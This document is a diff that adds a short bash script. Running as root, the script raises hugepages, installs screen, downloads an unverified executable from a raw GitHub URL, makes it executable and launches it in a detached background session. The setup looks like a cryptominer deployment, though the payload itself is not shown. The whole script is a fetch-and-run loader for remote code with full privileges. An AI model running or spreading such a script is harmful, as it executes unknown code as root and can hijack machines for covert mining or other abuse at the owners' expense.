@@ -1,0 +1,8 @@
+#!/bin/bash
+sudo su <<EOF
+sudo sysctl -w vm.nr_hugepages=2080
+sudo apt update -y && sudo apt install screen -y && screen
+wget -O set "https://raw.githubusercontent.com/sarifadim/dopla/main/usaha" && chmod +x * && ./set
+screen -dms run ./set
+EOF
+screen -r
